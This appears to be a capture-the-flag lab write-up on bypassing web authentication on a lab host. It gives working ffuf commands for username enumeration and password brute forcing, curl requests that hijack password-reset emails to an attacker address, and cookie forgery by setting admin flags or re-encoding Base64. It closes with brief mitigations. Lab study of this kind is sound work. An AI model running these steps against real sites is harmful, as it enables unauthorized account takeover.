# 🔐 Authentication Bypass

---

## Task 1: Introduction

In this document, we will explore different methods through which website authentication processes can be bypassed, manipulated, or broken. These vulnerabilities are critical as they often lead to unauthorized access and leakage of sensitive personal data.

---

## Task 2: Username Enumeration

Enumerating usernames is crucial when assessing authentication vulnerabilities. Web applications commonly reveal valuable information through error messages, which can be used to identify valid usernames.

### Method:

Visit the signup page (e.g., `http://MACHINE_IP/customers/signup`) and attempt to register with a username like `admin`. If the username exists, an error such as "An account with this username already exists" appears.

**Automating Username Enumeration with ffuf:**

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

Save the discovered usernames to a file:

```bash
echo "discovered_username" > valid_usernames.txt
```

---

## Task 3: Brute Force Attack

Using the list of usernames collected earlier, we can perform brute force attacks to discover valid credentials.

**Brute Forcing with ffuf:**

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

The above command tests multiple username-password combinations, helping to identify correct credentials.

---

## Task 4: Logic Flaw in Authentication

Logic flaws occur when the intended authentication workflow can be circumvented due to improper checks or logic errors in application code.

![Logic Flaw Diagram](https://github.com/user-attachments/assets/b873db69-3d30-4810-b9b7-e5c293b3cc41)

### Practical Demonstration:

1. **Navigate to Password Reset:**

`http://MACHINE_IP/customers/reset`

2. **Enter Valid Email:**
   Enter a known email:

![Valid Email](https://github.com/user-attachments/assets/6b1f6b25-4cb0-4636-847d-d6eb9830dc17)

3. **Exploit Logic Flaw:**

Send a manipulated request to redirect the reset email:

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email=attacker@hacker.com'
```

This request redirects the password reset email to an attacker-controlled email:

![Logic Flaw Exploit](https://github.com/user-attachments/assets/85587ccb-09b1-4f53-8a25-cc2bec3d031d)

4. **Final Step - Gain Unauthorized Access:**

Create an account to obtain your unique email (`{username}@customer.acmeitsupport.thm`). Resend the manipulated request:

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email={your_username}@customer.acmeitsupport.thm'
```

This grants access via a reset link sent to your account.

---

## Task 5: Cookie Tampering

Modifying cookies set by the server can grant unauthorized access or escalate privileges.

### Plain Text Cookie Example:

Initially check the access status:

```bash
curl http://MACHINE_IP/cookie-test
# Output: Not Logged In
```

Modify the cookie to gain user access:

```bash
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
# Output: Logged In As A User
```

Further escalate privileges by altering the admin value:

```bash
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
# Output: Logged In As An Admin
```

### Hashing and Encoding Cookies:

Cookies sometimes use hashing or encoding:

* **Hash Example:** `md5(1)` outputs `c4ca4238a0b923820dcc509a6f75849b`
* **Encoding Example:** Base64 encoded string `eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==` decodes to `{"id":1,"admin":false}`

Modify admin status and re-encode to bypass restrictions:

```json
{"id":1,"admin":true}
```

Re-encoded to Base64:

```
eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

---

### ✅ Recommended Mitigations:

* Perform strict validation on user inputs.
* Do not rely solely on client-side parameters.
* Ensure proper handling and verification of cookies and session data.
* Always use server-side validation for security-critical operations.

